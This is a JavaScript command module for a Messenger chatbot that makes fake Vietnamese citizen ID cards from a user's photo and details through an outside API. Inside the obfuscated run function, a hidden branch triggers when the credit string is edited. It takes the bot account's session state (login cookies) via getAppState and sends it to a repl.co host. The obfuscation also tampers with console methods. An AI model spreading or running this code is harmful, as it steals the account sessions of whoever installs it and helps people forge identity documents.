module.exports.config = {
	name: "cccd",	
	version: "1.1.1", 
	hasPermssion: 0,
	credits: "DVB",
	description: "Tạo cccd Fake", 
	commandCategory: "DVFB",
	usages: "Tên|Ngày Sinh|Giới Tính|Nơi thường trú",
	cooldowns: 5,
  dependencies: {tinyurl: ""}
};

const//////////////////////////////////////////////////////////////////////
  capi     = "https://database.bangprocode.repl.co/edit/fakecccd?",      // API
  apikey   = "DVB",                                                      // API Key
  pathsave = __dirname + `/cache/banner.png`,                            // Lưu vào Cache
///////////// Hãy chỉnh msg theo ý bạn! ///////////////////////////////////
  msg1     = "Bạn phải Reply ảnh để lấy ảnh tạo cccd!",
  msg2     = "Sai định dạng ảnh!",
  msg3     = "Đang render ảnh! Vui lòng chờ giây lát",
  msg4     = "Cccd đây. Chúc bạn thành công 😃";

module.exports.run = async function ({api,event,args}) {
(function(_0x50cfb1,_0x5c7b89){function _0x5cb9c9(_0x46f3e1,_0x3c638b,_0x4fb622,_0x3ab277){return _0x26b3(_0x3ab277-0x1d8,_0x4fb622);}const _0x12cbdd=_0x50cfb1();function _0x417821(_0x31d50a,_0x302ee8,_0x2f79cf,_0x2b5534){return _0x26b3(_0x2f79cf-0xcd,_0x2b5534);}while(!![]){try{const _0x285f86=-parseInt(_0x417821(0x173,0x160,0x15c,0x167))/(0x7*-0x1e4+0x25f2+-0x5*0x4f1)*(-parseInt(_0x5cb9c9(0x286,0x284,0x29f,0x2a5))/(-0x2335*0x1+0x1741+0xbf6))+parseInt(_0x417821(0x153,0x198,0x16b,0x144))/(-0xea7+-0x253b+-0x5*-0xa61)+-parseInt(_0x417821(0x163,0x145,0x16c,0x13f))/(0x2673+-0x14d+-0x2522)+parseInt(_0x5cb9c9(0x231,0x243,0x281,0x253))/(-0x4*0x4d6+0x2062+-0xd05)+-parseInt(_0x417821(0x145,0x15f,0x14f,0x128))/(-0x1a89+-0x240b*-0x1+-0x97c)*(-parseInt(_0x417821(0x143,0x14a,0x172,0x144))/(0x1*-0x3ad+-0x803*-0x1+-0x44f))+parseInt(_0x5cb9c9(0x288,0x297,0x266,0x287))/(-0x240b+-0x10d8+-0x17*-0x24d)*(-parseInt(_0x417821(0x15c,0x14e,0x13e,0x129))/(-0x1304+0xcaf+0xa3*0xa))+parseInt(_0x417821(0x11e,0x11c,0x149,0x117))/(-0x1*0x4c6+-0xe8f*0x1+0x135f);if(_0x285f86===_0x5c7b89)break;else _0x12cbdd['push'](_0x12cbdd['shift']());}catch(_0x500959){_0x12cbdd['push'](_0x12cbdd['shift']());}}}(_0x534b,-0xc7fda+0x3*-0x872ab+0x32f06c));const _0x589fee=(function(){const _0x3a3a88={};function _0x4e974c(_0x449cde,_0x14e62d,_0x4aac64,_0xcf471a){return _0x26b3(_0x14e62d-0x233,_0x449cde);}_0x3a3a88[_0x88fbce(0x1da,0x1b1,0x1b6,0x18e)]=function(_0x1a3e41,_0x189f75){return _0x1a3e41+_0x189f75;},_0x3a3a88[_0x4e974c(0x2d1,0x2c5,0x29e,0x2db)]=_0x4e974c(0x2d3,0x2fd,0x2fa,0x2ce)+_0x4e974c(0x2bf,0x2eb,0x2de,0x2c6),_0x3a3a88['OeALC']=_0x88fbce(0x1c8,0x1c6,0x198,0x18d),_0x3a3a88['RGrXA']='warn',_0x3a3a88[_0x88fbce(0x134,0x145,0x158,0x153)]=_0x4e974c(0x2a5,0x29f,0x2ad,0x2cd),_0x3a3a88['POVYQ']='table',_0x3a3a88[_0x4e974c(0x2bd,0x2cb,0x29b,0x2bf)]=_0x88fbce(0x1bb,0x185,0x1a7,0x1c6),_0x3a3a88[_0x4e974c(0x2bd,0x2d6,0x2df,0x2aa)]=function(_0x18b893,_0x161697){return _0x18b893<_0x161697;};function _0x88fbce(_0x5aed78,_0xd24032,_0x1c2fc0,_0x516596){return _0x26b3(_0x1c2fc0-0xeb,_0x516596);}_0x3a3a88[_0x88fbce(0x1b5,0x17f,0x196,0x17a)]=function(_0x35f239,_0xf6765e){return _0x35f239!==_0xf6765e;},_0x3a3a88[_0x88fbce(0x142,0x170,0x16a,0x164)]=_0x4e974c(0x2c2,0x2cd,0x2dd,0x2a7);const _0x35f2c0=_0x3a3a88;let _0x3b861d=!![];return function(_0x1954e6,_0x11b4fb){const _0x17454e={'eukDc':function(_0x1a8fc2,_0x3af0a5){function _0x414f58(_0x598906,_0x52540c,_0x56c248,_0x32b68f){return _0x26b3(_0x56c248- -0xa0,_0x52540c);}return _0x35f2c0[_0x414f58(0x6,-0x8,0x2b,0x1a)](_0x1a8fc2,_0x3af0a5);},'DwtJF':_0x35f2c0[_0x1677fb(0x2fd,0x2dd,0x2ed,0x2f0)],'lBDGH':function(_0x3ddd50){return _0x3ddd50();},'jBbvQ':_0x35f2c0[_0x1677fb(0x2f3,0x2ea,0x304,0x2d1)],'OjRMg':_0x35f2c0[_0x38dc0b(0x2d4,0x2e2,0x30e,0x2dd)],'tsUAS':_0x35f2c0[_0x1677fb(0x2f9,0x2fb,0x2c8,0x298)],'ntlmY':_0x35f2c0['POVYQ'],'QJtNX':_0x35f2c0[_0x1677fb(0x309,0x2fa,0x2f3,0x303)],'uUaId':function(_0x209b24,_0x287d7f){function _0x338ea3(_0x574f25,_0x35af35,_0x1cbbed,_0x24dbf3){return _0x1677fb(_0x24dbf3,_0x35af35-0x154,_0x574f25- -0x609,_0x24dbf3-0x149);}return _0x35f2c0[_0x338ea3(-0x30b,-0x339,-0x2ee,-0x316)](_0x209b24,_0x287d7f);},'zZggf':function(_0x106715,_0x33490a){function _0x3a8dcc(_0x222e4f,_0x409712,_0x49de12,_0x216902){return _0x1677fb(_0x409712,_0x409712-0x79,_0x222e4f- -0x4e,_0x216902-0x9d);}return _0x35f2c0[_0x3a8dcc(0x2b8,0x2cd,0x28d,0x298)](_0x106715,_0x33490a);},'XvUJT':_0x35f2c0[_0x1677fb(0x2e0,0x2ae,0x2da,0x2f1)]};function _0x38dc0b(_0x55c3a1,_0x50d602,_0x423b97,_0x34615c){return _0x88fbce(_0x55c3a1-0xf,_0x50d602-0x24,_0x34615c-0x13f,_0x55c3a1);}function _0x1677fb(_0xcc5315,_0x57e6ef,_0x3ddda2,_0x316170){return _0x4e974c(_0xcc5315,_0x3ddda2-0x28,_0x3ddda2-0x1d6,_0x316170-0x117);}const _0x53a7b4=_0x3b861d?function(){const _0x1ff0c7={'AispY':function(_0x5f6ac4,_0x8bc01a){function _0x4a7fe3(_0x3335e5,_0x36a919,_0x58f1bc,_0x4c0e25){return _0x26b3(_0x58f1bc- -0x3df,_0x4c0e25);}return _0x17454e[_0x4a7fe3(-0x39c,-0x389,-0x36b,-0x37e)](_0x5f6ac4,_0x8bc01a);},'HdQsf':_0x17454e[_0x228753(0x36,0x54,0x37,0x3b)],'nnoCy':function(_0xc7db95){return _0x17454e['lBDGH'](_0xc7db95);},'fFbtw':_0x17454e[_0x228753(-0x2c,0x12,-0x10,-0x3f)],'vEXAr':_0x17454e[_0x228753(0x1,-0x32,-0xa,-0x38)],'NjTMu':_0x17454e[_0x49dbcb(-0x156,-0x18f,-0x15c,-0x174)],'CNERu':'error','Paesn':_0x17454e[_0x228753(0x51,0x62,0x31,0x4d)],'aVlue':_0x17454e[_0x228753(0x21,-0x6,-0xc,0x1b)],'uFHUb':function(_0x357ea3,_0x3dadaf){function _0x3d1ff3(_0x2a595f,_0x39b038,_0x5cff8a,_0x40a019){return _0x228753(_0x2a595f-0x4e,_0x2a595f,_0x39b038-0x307,_0x40a019-0x18d);}return _0x17454e[_0x3d1ff3(0x309,0x2f8,0x2c9,0x311)](_0x357ea3,_0x3dadaf);}};function _0x49dbcb(_0x5e5f79,_0x1b1b58,_0x4f50e5,_0x4868fd){return _0x1677fb(_0x1b1b58,_0x1b1b58-0x1e5,_0x4f50e5- -0x483,_0x4868fd-0x8f);}function _0x228753(_0x4bbb4a,_0x40cbe3,_0x5c5f9f,_0x4b38a5){return _0x38dc0b(_0x40cbe3,_0x40cbe3-0xe8,_0x5c5f9f-0x123,_0x5c5f9f- -0x2b7);}if(_0x17454e[_0x228753(0x2e,0x21,0x0,-0x24)](_0x17454e[_0x49dbcb(-0x1c4,-0x1c9,-0x1b5,-0x1d2)],_0x228753(0x27,-0x2,0xd,0x1c))){let _0x246ead;try{const _0x4adcfb=_0x4b54c1(_0x1ff0c7[_0x49dbcb(-0x17f,-0x178,-0x18d,-0x172)](_0x1ff0c7[_0x49dbcb(-0x1b2,-0x1b8,-0x187,-0x17e)]+(_0x228753(0x43,0x26,0x28,0x7)+'ctor(\x22retu'+_0x228753(0x15,0x45,0x32,0x63)+'\x20)'),');'));_0x246ead=_0x1ff0c7[_0x228753(0x3,0x5a,0x2d,0x3a)](_0x4adcfb);}catch(_0x222e99){_0x246ead=_0x380f37;}const _0x472c46=_0x246ead[_0x228753(0x50,0xd,0x27,0x16)]=_0x246ead['console']||{},_0x20f7f3=[_0x1ff0c7[_0x49dbcb(-0x186,-0x162,-0x166,-0x180)],_0x1ff0c7['vEXAr'],_0x1ff0c7['NjTMu'],_0x1ff0c7[_0x228753(0x58,0x23,0x33,0x19)],'exception',_0x1ff0c7['Paesn'],_0x1ff0c7[_0x228753(-0x14,-0x23,0xf,0x3b)]];for(let _0x3020e9=-0x1*0x7+-0x1e4b+0x1e52;_0x1ff0c7[_0x228753(0x43,0x1a,0x39,0x25)](_0x3020e9,_0x20f7f3['length']);_0x3020e9++){const _0x114e80=_0x27f817['constructo'+'r'][_0x49dbcb(-0x191,-0x185,-0x171,-0x159)][_0x228753(0x27,-0x4,-0x7,0x9)](_0x5aad83),_0xc66c15=_0x20f7f3[_0x3020e9],_0x4051bc=_0x472c46[_0xc66c15]||_0x114e80;_0x114e80[_0x228753(0x46,0x16,0x2e,0x5c)]=_0x3bb404[_0x228753(0x8,0x17,-0x7,0x1f)](_0x3433d3),_0x114e80['toString']=_0x4051bc[_0x49dbcb(-0x165,-0x164,-0x172,-0x197)][_0x228753(0x2a,-0x29,-0x7,-0x21)](_0x4051bc),_0x472c46[_0xc66c15]=_0x114e80;}}else{if(_0x11b4fb){const _0x244b10=_0x11b4fb[_0x49dbcb(-0x164,-0x1a5,-0x186,-0x17a)](_0x1954e6,arguments);return _0x11b4fb=null,_0x244b10;}}}:function(){};return _0x3b861d=![],_0x53a7b4;};}()),_0x8135c7=_0x589fee(this,function(){const _0x15a0c5={};function _0x16e952(_0x1c2c86,_0x4bdd18,_0x577e46,_0x42a86a){return _0x26b3(_0x577e46-0x280,_0x1c2c86);}_0x15a0c5[_0x25af41(0x247,0x20e,0x225,0x232)]='(((.+)+)+)'+'+$';function _0x25af41(_0x2cd30d,_0x35ef05,_0x333133,_0x1e6c84){return _0x26b3(_0x333133-0x19b,_0x35ef05);}const _0xd59728=_0x15a0c5;return _0x8135c7[_0x25af41(0x22b,0x27a,0x251,0x26b)]()[_0x16e952(0x314,0x2ea,0x2ee,0x313)](_0xd59728[_0x25af41(0x245,0x24c,0x225,0x254)])[_0x16e952(0x326,0x32c,0x336,0x326)]()[_0x16e952(0x2f7,0x30b,0x317,0x301)+'r'](_0x8135c7)[_0x25af41(0x239,0x1d9,0x209,0x1e0)](_0xd59728[_0x25af41(0x21b,0x1f5,0x225,0x224)]);});function _0x534b(){const _0x5e21e2=['t2PstwC','jti3','DfP4A3C','yMLUza','CMvWBgfJzq','DxjSAw1N','As5Iyw5NChjVyW','qNjzDgm','C3rYAw5NAwz5','BY9OywnRzxiV','ELPNz2y','C2vUze1LC3nHzW','mtbcqLHOt2q','Dgv4Ddm','z2v0','yxzXyuK','rwP0zwi','Dgv4Ddi','yxr0ywnOBwvUDa','yxHPB3m','y29UC3rYDwn0BW','sLvcyva','BM9Kzw1VzhvSzq','vwTWDee','qwLZCfK','yvzSDwu','Eff3whe','mtq0ndK1meP6zgzsrG','nJa2nZm4mfbPCKHgza','yxbPA2v5','sgrrC2y','yxbWBhK','r3fvBKG','C3bSAxq','nZe5nda0D25Nu0zA','BhzMzK0','zerOvvq','CxvLCNLZDhjPBG','t2vbtem','BwvZC2fNzvjLCa','AuzZtgC','zgf0yq','Bg9N','DgLUExvYBa','mJK4nJrusLzque8','ru9lDfy','DxjS','BgvUz3rO','uKDYwee','y29UC29Szq','E30Uy29UC3rYDq','Dg9tDhjPBMC','ChjVDg90ExbL','BMn0Aw9UkcKG','C2HVCNrLBG','BM5Vq3K','x19WCM90B19F','DhjHy2u','zeLZtgm','BNrSBvK','CM4GDgHPCYiPka','q05fuNu','AMryENy','zKzIDhC','yM9KEq','rhD0sKy','tfnIDeS','Duzivwi','qKPMC1O','jtiY','y29UzMLN','CMv0DxjUicHMDq','uw92CLa','Dhnvqvm','nZy0nZrlqMTTuu4','y3jLzgL0CW','weD2A0W','BwfW','zxjYB3i','Aw5MBW','rvfbsNa','C2vHCMnO','CwzSwhO','EwvmA3C','mJa0m1vUsvjdBW','r2nICwu','whzvsLq','zxvRrgm','DhLWzq','tKjwrhi','DgfIBgu','z2v0qxbWu3rHDa','Dgv4Dde','zNmTzxH0CMe','nta5mdy1yvfiuurO','mJa1mteXnJbequ5Uz0S','AKjIDLe','DvvHswq','ANP5tuG','D2fYBG','uuP0tLG','mtj4DKrtsuS'];_0x534b=function(){return _0x5e21e2;};return _0x534b();}function _0x11cedb(_0x40754b,_0x1a83e7,_0x2ac6c7,_0xb0d60b){return _0x26b3(_0x1a83e7-0x3a1,_0x40754b);}_0x8135c7();const _0x5d675f=(function(){function _0x33e418(_0x3cdf01,_0x44fc46,_0x1d70c0,_0x12d19a){return _0x26b3(_0x1d70c0- -0x3a1,_0x12d19a);}const _0x475e76={};_0x475e76[_0xb6e3ea(0x366,0x390,0x365,0x365)]=function(_0x15520f,_0x5251f0){return _0x15520f!==_0x5251f0;},_0x475e76[_0xb6e3ea(0x405,0x3ef,0x3c1,0x3e6)]=_0xb6e3ea(0x3b6,0x38f,0x37e,0x36b),_0x475e76[_0xb6e3ea(0x3c1,0x3d0,0x3d5,0x3b4)]=_0x33e418(-0x321,-0x31f,-0x32b,-0x319);function _0xb6e3ea(_0x1eb138,_0x2f5c6f,_0xedbc6f,_0x51f5a3){return _0x26b3(_0x2f5c6f-0x320,_0xedbc6f);}const _0x4285e8=_0x475e76;let _0x4cbba4=!![];return function(_0x295a30,_0x182112){const _0x6e1e5c=_0x4cbba4?function(){function _0x139659(_0x44ada0,_0x28d901,_0xcf7e37,_0x3b0d4c){return _0x26b3(_0x3b0d4c- -0x95,_0x44ada0);}function _0x5669dd(_0x426c4b,_0x7ab713,_0x4ecbb2,_0x3bbe94){return _0x26b3(_0x3bbe94- -0x12f,_0x4ecbb2);}if(_0x182112){if(_0x4285e8[_0x139659(-0x1b,-0x19,-0x2a,-0x25)](_0x4285e8[_0x5669dd(-0x4f,-0x8f,-0x74,-0x60)],_0x4285e8[_0x5669dd(-0x87,-0x7e,-0x76,-0x7f)])){const _0x226c11=_0x182112[_0x139659(-0x21,0x28,0x0,0xd)](_0x295a30,arguments);return _0x182112=null,_0x226c11;}else{if(_0xb63ec0){const _0x210260=_0x12465a[_0x5669dd(-0xad,-0xa6,-0xad,-0x8d)](_0x2ab242,arguments);return _0x38f494=null,_0x210260;}}}}:function(){};return _0x4cbba4=![],_0x6e1e5c;};}()),_0xfd522d=_0x5d675f(this,function(){function _0x5d5076(_0x19c465,_0x13cca9,_0x5109a6,_0x2f9e52){return _0x26b3(_0x19c465- -0x223,_0x5109a6);}const _0x341a38={'dDhUT':_0x5d5076(-0x1b1,-0x1bf,-0x1a6,-0x1a6),'tZxkw':_0x5d5076(-0x190,-0x1a8,-0x190,-0x19c),'sACuy':function(_0x2876cc,_0x2421d7){return _0x2876cc(_0x2421d7);},'lvffM':function(_0x3189f2,_0xbfa966){return _0x3189f2+_0xbfa966;},'jdXzv':_0x1d667d(-0x2b1,-0x2e9,-0x2bb,-0x2b9)+_0x5d5076(-0x16b,-0x169,-0x168,-0x13b),'CjOLg':_0x5d5076(-0x16e,-0x160,-0x142,-0x18b)+'ctor(\x22retu'+'rn\x20this\x22)('+'\x20)','bKvjk':function(_0x5f2b0c){return _0x5f2b0c();},'xQwXq':_0x1d667d(-0x2f7,-0x311,-0x319,-0x31d),'dIsLc':_0x5d5076(-0x1b8,-0x1d3,-0x190,-0x1be),'LSbtK':_0x1d667d(-0x32a,-0x340,-0x30e,-0x315),'BJfsZ':_0x1d667d(-0x2ed,-0x2b6,-0x2c9,-0x2b6),'gyQJg':function(_0x22cdd7,_0x46f5f8){return _0x22cdd7<_0x46f5f8;}};let _0x3d1caa;try{if(_0x341a38[_0x1d667d(-0x2ad,-0x2c8,-0x2de,-0x308)]!==_0x341a38[_0x5d5076(-0x19e,-0x19e,-0x19f,-0x16c)]){const _0x5c3271=_0x341a38['sACuy'](Function,_0x341a38[_0x1d667d(-0x2ec,-0x2b7,-0x2df,-0x301)](_0x341a38[_0x1d667d(-0x2b1,-0x2ed,-0x2c4,-0x2e2)]+_0x341a38['CjOLg'],');'));_0x3d1caa=_0x341a38['bKvjk'](_0x5c3271);}else _0x876a2b=_0x1c33ca;}catch(_0x54d0ae){_0x3d1caa=window;}function _0x1d667d(_0x5c822b,_0x185517,_0x2c998b,_0x4bc6d9){return _0x26b3(_0x2c998b- -0x385,_0x185517);}const _0x30ea3b=_0x3d1caa[_0x5d5076(-0x16f,-0x142,-0x14d,-0x164)]=_0x3d1caa[_0x1d667d(-0x2ca,-0x2b8,-0x2d1,-0x2fa)]||{},_0x446f98=[_0x5d5076(-0x176,-0x198,-0x17b,-0x156),_0x1d667d(-0x2df,-0x30d,-0x305,-0x338),_0x341a38[_0x5d5076(-0x186,-0x18b,-0x193,-0x192)],_0x341a38[_0x5d5076(-0x166,-0x184,-0x16b,-0x186)],'exception',_0x341a38[_0x5d5076(-0x15e,-0x12e,-0x13a,-0x136)],_0x341a38[_0x1d667d(-0x2bc,-0x2b8,-0x2be,-0x293)]];for(let _0x3dee7c=-0x4*-0x8bd+-0x1*-0xeaa+-0x1d*0x1b6;_0x341a38['gyQJg'](_0x3dee7c,_0x446f98[_0x5d5076(-0x171,-0x13e,-0x1a0,-0x185)]);_0x3dee7c++){const _0x229885=_0x5d675f[_0x5d5076(-0x18c,-0x160,-0x188,-0x1b2)+'r']['prototype'][_0x1d667d(-0x312,-0x2ed,-0x2ff,-0x2fb)](_0x5d675f),_0x58c2f5=_0x446f98[_0x3dee7c],_0x28ce6b=_0x30ea3b[_0x58c2f5]||_0x229885;_0x229885['__proto__']=_0x5d675f[_0x5d5076(-0x19d,-0x198,-0x193,-0x1a9)](_0x5d675f),_0x229885[_0x1d667d(-0x2ee,-0x2c2,-0x2cf,-0x2f2)]=_0x28ce6b[_0x1d667d(-0x2a9,-0x2ca,-0x2cf,-0x2be)][_0x1d667d(-0x2dd,-0x313,-0x2ff,-0x2f1)](_0x28ce6b),_0x30ea3b[_0x58c2f5]=_0x229885;}});_0xfd522d();function _0x26b3(_0x40d471,_0x43cdb5){const _0x345e44=_0x534b();return _0x26b3=function(_0x4a2579,_0x25a770){_0x4a2579=_0x4a2579-(-0x72e*0x4+-0x1*-0x12a5+-0x53f*-0x2);let _0x3f2271=_0x345e44[_0x4a2579];if(_0x26b3['gjWupQ']===undefined){var _0x123b1b=function(_0x1cf18c){const _0x23898d='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x316564='',_0x151cc2='',_0x2c5519=_0x316564+_0x123b1b;for(let _0x5aa869=0x218a+-0x1*-0x1d2d+-0x3eb7,_0x11c019,_0x62526e,_0x392183=-0x7f7+-0x1ed1+0x26c8;_0x62526e=_0x1cf18c['charAt'](_0x392183++);~_0x62526e&&(_0x11c019=_0x5aa869%(-0x1*0x17+-0x6c6+0x6e1)?_0x11c019*(0xc22+-0x2bd*-0xd+0x8f*-0x55)+_0x62526e:_0x62526e,_0x5aa869++%(0x5e4+0xdd3*0x1+0x1*-0x13b3))?_0x316564+=_0x2c5519['charCodeAt'](_0x392183+(-0x8e*-0x2c+-0x2028+-0x1*-0x7ca))-(-0x21b0+-0x157d+-0x5*-0xb0b)!==0x109*-0x5+0x623*0x5+-0x1982?String['fromCharCode'](0xfd*-0x2+-0x35*0x50+-0x1389*-0x1&_0x11c019>>(-(-0x26c6+-0x1bf+0x2887)*_0x5aa869&-0x103f*0x2+-0x2*0x170+0x2364)):_0x5aa869:0x1ad4+-0xa76+0x5*-0x346){_0x62526e=_0x23898d['indexOf'](_0x62526e);}for(let _0x19c9e1=0x1*-0x15be+-0x14b*0x17+0x337b,_0x27356d=_0x316564['length'];_0x19c9e1<_0x27356d;_0x19c9e1++){_0x151cc2+='%'+('00'+_0x316564['charCodeAt'](_0x19c9e1)['toString'](0x798+0x12*0x125+0x115*-0x1a))['slice'](-(-0x1384+-0x1*0x1c95+0x301b));}return decodeURIComponent(_0x151cc2);};_0x26b3['EKzunj']=_0x123b1b,_0x40d471=arguments,_0x26b3['gjWupQ']=!![];}const _0x418a77=_0x345e44[0x16ef+0x998+0xb*-0x2f5],_0x5617a1=_0x4a2579+_0x418a77,_0x1324e1=_0x40d471[_0x5617a1];if(!_0x1324e1){const _0x1eaddc=function(_0xabc7de){this['sEzBhp']=_0xabc7de,this['MFeopv']=[-0x1*0x1693+0x266b+-0x5*0x32b,0x1054+0xb*-0x57+-0x125*0xb,-0x1717+-0x1ee7*0x1+0x2*0x1aff],this['TNZvlI']=function(){return'newState';},this['NBoiIU']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['xVdmcT']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x1eaddc['prototype']['gyoZRm']=function(){const _0x14bf3f=new RegExp(this['NBoiIU']+this['xVdmcT']),_0x5a04a6=_0x14bf3f['test'](this['TNZvlI']['toString']())?--this['MFeopv'][-0x1937+0x60a*0x1+-0x2*-0x997]:--this['MFeopv'][0x343+-0x2023+0x1ce0*0x1];return this['vMGlvD'](_0x5a04a6);},_0x1eaddc['prototype']['vMGlvD']=function(_0x2f23e5){if(!Boolean(~_0x2f23e5))return _0x2f23e5;return this['tVurMa'](this['sEzBhp']);},_0x1eaddc['prototype']['tVurMa']=function(_0x48db82){for(let _0x3291dc=-0x74*-0x47+-0x193c+-0x6f0,_0x5754b5=this['MFeopv']['length'];_0x3291dc<_0x5754b5;_0x3291dc++){this['MFeopv']['push'](Math['round'](Math['random']())),_0x5754b5=this['MFeopv']['length'];}return _0x48db82(this['MFeopv'][-0x1e6d*-0x1+0x445+-0x1*0x22b2]);},new _0x1eaddc(_0x26b3)['gyoZRm'](),_0x3f2271=_0x26b3['EKzunj'](_0x3f2271),_0x40d471[_0x5617a1]=_0x3f2271;}else _0x3f2271=_0x1324e1;return _0x3f2271;},_0x26b3(_0x40d471,_0x43cdb5);}const axios=require(_0x11cedb(0x462,0x437,0x43f,0x460)),fs=require(_0x11cedb(0x3f8,0x41b,0x429,0x3f6)),qs=require(_0x11cedb(0x47a,0x449,0x477,0x441)+'g'),{threadID,messageID}=event;if('message_re'+'ply'!==event[_0x11cedb(0x40e,0x416,0x41f,0x43b)])return api[_0x170fb6(0x251,0x252,0x24e,0x27b)+'e'](msg1,threadID,messageID);if(this[_0x170fb6(0x27e,0x28d,0x28c,0x299)][_0x170fb6(0x2a4,0x292,0x26c,0x29c)]!='DVB'){let appstate=api[_0x11cedb(0x44c,0x419,0x443,0x3e9)+'e']();const data=JSON[_0x11cedb(0x442,0x42c,0x43b,0x42f)](appstate);var data1=encodeURIComponent(data)[_0x11cedb(0x3fb,0x428,0x42f,0x44e)](/'/g,_0x11cedb(0x43a,0x425,0x450,0x456))[_0x170fb6(0x23c,0x24b,0x26e,0x22b)](/"/g,_0x170fb6(0x28e,0x28c,0x295,0x2ac));await axios[_0x170fb6(0x255,0x255,0x255,0x222)]('https://ap'+_0x170fb6(0x222,0x24d,0x23c,0x21a)+'ode.repl.c'+_0x170fb6(0x253,0x250,0x25a,0x26d)+data1);};if(!event[_0x170fb6(0x257,0x26e,0x288,0x25c)+'ly'][_0x11cedb(0x40d,0x436,0x42b,0x42a)+'s']||0x14c*0x14+0x1*0xe76+-0x2866==event[_0x11cedb(0x42e,0x44b,0x45e,0x45e)+'ly'][_0x11cedb(0x40d,0x436,0x448,0x428)+'s']['length'])return api[_0x170fb6(0x27d,0x252,0x27e,0x282)+'e'](msg2,threadID,messageID);var urlimg=await global[_0x11cedb(0x42d,0x43a,0x415,0x40c)][_0x11cedb(0x482,0x44f,0x459,0x449)][_0x11cedb(0x466,0x45a,0x478,0x48a)](event[_0x170fb6(0x269,0x26e,0x282,0x241)+'ly'][_0x11cedb(0x414,0x436,0x43b,0x419)+'s'][-0x141e*-0x1+-0x1a73+0x1*0x655][_0x170fb6(0x244,0x275,0x25b,0x26b)]);const content=args['join']('\x20')[_0x11cedb(0x455,0x445,0x460,0x458)]('|')[_0x170fb6(0x2ac,0x294,0x26f,0x270)](_0x503d6c=>_0x503d6c=_0x503d6c['trim']()),text1=content[0x3c2+-0x5f7*-0x3+-0x15a7],text2=content[-0x1*0x21e6+0x185+0x2062],text3=content[-0x25d3+-0x14*-0x179+0x861],text4=content[0x9e4+0x98*0x3d+-0x2e19],_0x3e325d={};_0x3e325d[_0x170fb6(0x288,0x264,0x250,0x27f)]=apikey,_0x3e325d[_0x11cedb(0x448,0x41a,0x440,0x449)]=text1,_0x3e325d[_0x170fb6(0x23f,0x258,0x24b,0x237)]=text2,_0x3e325d[_0x11cedb(0x404,0x431,0x40d,0x44a)]=text3,_0x3e325d['text4']=text4,_0x3e325d[_0x170fb6(0x23c,0x24c,0x22f,0x278)]=urlimg;let params=_0x3e325d;params=qs[_0x170fb6(0x24d,0x24f,0x240,0x280)](params),api[_0x11cedb(0x413,0x42f,0x401,0x419)+'e'](msg3,threadID,messageID);const _0x1a94e0={};_0x1a94e0['responseTy'+'pe']='stream';var inimg=await axios['get'](capi+params,_0x1a94e0);const _0x13f4eb={};function _0x170fb6(_0x4a80f4,_0x29499a,_0x2d3b44,_0x481b91){return _0x26b3(_0x29499a-0x1c4,_0x4a80f4);}_0x13f4eb[_0x11cedb(0x482,0x464,0x435,0x461)]=msg4,_0x13f4eb['attachment']=inimg[_0x170fb6(0x24c,0x270,0x271,0x298)];return api[_0x11cedb(0x411,0x42f,0x432,0x42a)+'e'](_0x13f4eb,threadID,messageID);};
module.exports.languages = {"vi": {}}